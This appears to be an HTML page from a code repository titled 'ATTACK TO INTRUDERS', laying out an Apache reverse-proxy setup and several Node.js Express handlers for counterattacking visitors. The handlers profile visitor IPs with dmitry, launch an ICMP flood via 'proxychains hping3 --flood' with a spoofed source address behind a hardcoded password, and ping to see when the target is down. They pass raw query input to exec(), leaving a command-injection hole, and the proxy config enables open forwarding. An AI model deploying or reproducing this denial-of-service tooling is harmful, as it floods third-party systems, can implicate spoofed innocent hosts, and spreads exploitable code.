<hi>ATTACK TO INTRUDERS 😹</h1>
<img src="https://github.com/dewebdes/Iranian-Cyber-Army/blob/master/ghost/fishing/bg-img-01.jpg" />
<hr>
<ul>
  <li><h2>Create Feed For Intruders</h2>
    <pre>
    <VirtualHost *:443>
ServerName admin.yourdomain.com


#CustomLog <LOG-PATH> combined
#ErrorLog <ERROR-LOG-PATH>
ProxyRequests On


# Example SSL configuration
SSLEngine on
SSLProtocol all -SSLv2
SSLCipherSuite HIGH:MEDIUM:!aNULL:!MD5
SSLCertificateKeyFile /root/SSL/star_yourdomain_com.key
SSLCertificateFile /root/SSL/STAR_yourdomain_com.crt
SSLCertificateChainFile /root/SSL/STAR_yourdomain_com.ca-bundle
ProxyPreserveHost On
ProxyPass / http://localhost:yourportnumber/
ProxyPassReverse // http://localhost:yourportnumber/
<IfModule mod_headers.c>
Header set Access-Control-Allow-Origin "*"
</IfModule>
</VirtualHost>
<VirtualHost *:80>
ServerAdmin info@yourdomain.com
ServerName admin.yourdomain.com

ProxyRequests On
ProxyPreserveHost On
<IfModule mod_headers.c>
Header set Access-Control-Allow-Origin "*"
</IfModule>

<Proxy *>
Order deny,allow
Allow from all
</Proxy>

<Location />
ProxyPass http://localhost:yourportnumber/
ProxyPassReverse http://localhost:yourportnumber/
</Location>

</VirtualHost>
    </pre>
  </li>
  <li>
  <h2>Send Intruder Connections to ATTACK Engine</h2>
  <pre>
  app.get('/', function(req, res){
	var ipAddress = req.headers['x-forwarded-for'];
const https = require('https')
	var request = require('request');

	var propertiesObject = { cmd : 'getipinfo',  dip : ipAddress  };

	request({url:'https://ATTACK.yourdomain.com', qs:propertiesObject}, function(err, response, body) {
		if(err) { console.log("**ERROR: "+err); return; }
		  res.send("Net info for " + ipAddress + "<br>" + body);
	});

//  res.send('Hello Admin! - '+ipAddress);
})
  </pre>
</li>
<li>
  <h2>DMitry, Full Detect Connection Network Arc.</h2>
  <pre>
  app.get('/', function(req, res){
	var ipAddress = req.headers['x-forwarded-for'];
	var dip = req.query.dip;
	var cmd = "dmitry -i " + dip;

var child;
	child = exec(cmd,
			function (error, stdout, stderr) {
				var dlog = 'stdout: ' + stdout + "\n";
				dlog += 'stderr: ' + stderr + "\n";
				if (error !== null) {
					dlog += 'exec error: ' + error + "\n";
				}
				res.send(dlog);
			});
})
  </pre>
</li>
<li>
  <h2>Death ATTACK 😈</h2>
  <pre>
  app.get('/', function(req, res){
	var ipAddress = req.headers['x-forwarded-for'];
	console.log("post: "+ipAddress);
	console.log("\n\n" + JSON.stringify(req.headers) + "\n\n" );

	var dip1 = req.query.dip1;
	var dip2 = req.query.dip2;
	var dsec = req.query.dsec;

	console.log("dip1: "+dip1+"\n"+"dip2: "+dip2+"\n"+"dsec: "+dsec+"\n");

if(dsec != "yakhoda"){return;}

console.log("OK1");

if(dip1==undefined){return;}

console.log("OK2");

var cmd = "proxychains hping3 -1 --flood " + dip1 + " -a " + dip2;//"dmitry -i " + dip;

console.log(cmd);
var child;
	child = exec(cmd,
			function (error, stdout, stderr) {
				var dlog = 'stdout: ' + stdout + "\n";
				dlog += 'stderr: ' + stderr + "\n";
				if (error !== null) {
					dlog += 'exec error: ' + error + "\n";
				}
				var resp = dlog;
				console.log("\n\n"+resp+"\n\n");
				res.send(resp);
			});
})
  </pre>
</li>
<li>
  <h2>Check WHEN the TARGET was DONE 😳</h2>
  <pre>
  app.get('/', function(req, res){
	var ipAddress = req.headers['x-forwarded-for'];
	var dm = req.query.dip;
	var cmd = "ping " + dm;

var child;
	child = exec(cmd,
			function (error, stdout, stderr) {
				var dlog = 'stdout: ' + stdout + "\n";
				dlog += 'stderr: ' + stderr + "\n";
				if (error !== null) {
					dlog += 'exec error: ' + error + "\n";
				}
				res.send(dlog);
			});
})
  </pre>
</li>
 </ul>
